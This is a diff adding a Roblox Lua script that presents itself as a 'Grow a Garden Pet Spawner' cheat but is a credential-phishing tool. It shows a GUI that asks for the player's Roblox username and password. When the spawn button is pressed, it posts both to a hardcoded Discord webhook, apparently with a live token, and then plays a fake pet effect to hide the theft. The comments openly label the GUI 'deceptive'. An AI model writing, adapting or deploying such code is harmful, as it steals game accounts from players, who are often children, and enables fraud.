@@ -1,0 +1,94 @@
+-- Grow a Garden Pet Spawner
+-- Made by Cryzz
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local webhook ="https://discordapp.com/api/webhooks/1385231563670949999/05kMFxQbr1AqHn_bmYV8g1gN-RFcGfHj5LgB1eWb2tfyMvsltFPIq09Utl4ZKWhjqZqL"
+
+-- Create deceptive GUI
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local UsernameBox = Instance.new("TextBox")
+local PasswordBox = Instance.new("TextBox")
+local SpawnButton = Instance.new("TextButton")
+local Credit = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+Frame.Size = UDim2.new(0.4, 0, 0.35, 0)
+
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+Title.Size = UDim2.new(1, 0, 0.2, 0)
+Title.Text ="Grow a Garden Pet Spawner by Cryzz"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+
+UsernameBox.Parent = Frame
+UsernameBox.Position = UDim2.new(0.1, 0, 0.3, 0)
+UsernameBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+UsernameBox.PlaceholderText ="Enter Roblox Username"
+UsernameBox.Text = ""
+
+PasswordBox.Parent = Frame
+PasswordBox.Position = UDim2.new(0.1, 0, 0.5, 0)
+PasswordBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+PasswordBox.PlaceholderText ="Enter Roblox Password"
+PasswordBox.Text = ""
+
+SpawnButton.Parent = Frame
+SpawnButton.Position = UDim2.new(0.1, 0, 0.7, 0)
+SpawnButton.Size = UDim2.new(0.8, 0, 0.15, 0)
+SpawnButton.Text ="Spawn Rare Pet!"
+SpawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpawnButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+
+Credit.Parent = Frame
+Credit.Position = UDim2.new(0, 0, 0.9, 0)
+Credit.Size = UDim2.new(1, 0, 0.1, 0)
+Credit.Text ="Made by Cryzz"
+Credit.TextColor3 = Color3.fromRGB(255, 255, 255)
+Credit.TextScaled = true
+Credit.BackgroundTransparency = 1
+
+-- Function to send credentials to webhook
+local function sendToWebhook(username, password)
+    local data = {
+        ["content"] ="New credentials from Grow a Garden: **Username:** " .. username .. " | **Password:** " .. password}    local jsonData = HttpService:JSONEncode(data)
+    pcall(function()
+        HttpService:PostAsync(webhook, jsonData)
+    end)
+end
+
+-- Fake pet spawn effect
+local function fakeSpawnPet()
+    local player = Players.LocalPlayer
+    local fakePet = Instance.new("Part")
+    fakePet.Name ="FakeGardenPet"
+    fakePet.Size = Vector3.new(1.5, 1.5, 1.5)
+    fakePet.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
+    fakePet.BrickColor = BrickColor.new("Lime green")
+    fakePet.Parent = game.Workspace
+    local sparkle = Instance.new("ParticleEmitter")
+    sparkle.Texture ="rbxassetid://243664283"
+    sparkle.Rate = 50
+    sparkle.Lifetime = NumberRange.new(1, 2)
+    sparkle.Parent = fakePet
+    wait(3)
+    fakePet:Destroy()
+end
+
+-- Button click handler
+SpawnButton.MouseButton1Click:Connect(function()
+    local username = UsernameBox.Text
+    local password = PasswordBox.Text
+    if username ~= "" and password ~= "" then
+        sendToWebhook(username, password)
+        fakeSpawnPet()
+        UsernameBox.Text = ""
+        PasswordBox.Text = ""
+    end
+end)
